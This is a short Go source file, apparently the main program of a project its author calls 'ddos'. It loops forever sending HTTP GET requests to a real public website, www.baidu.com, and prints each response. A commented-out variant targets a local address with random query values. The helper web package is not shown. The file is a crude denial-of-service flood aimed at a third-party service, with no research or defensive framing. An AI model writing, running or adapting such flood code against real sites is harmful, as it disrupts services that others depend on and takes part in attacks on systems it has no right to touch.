// ddos project main.go
package main

import (
	"ddos/web"
	"fmt"
//	"math/rand"
//	"strconv"
)

func main() {
	for {
//		ip := rand.Intn(255)
//		fmt.Println(web.Get("http://192.168.56.1:8001/test?ip=" + strconv.Itoa(ip)))
		fmt.Println(web.Get("http://www.baidu.com"))

	}

}
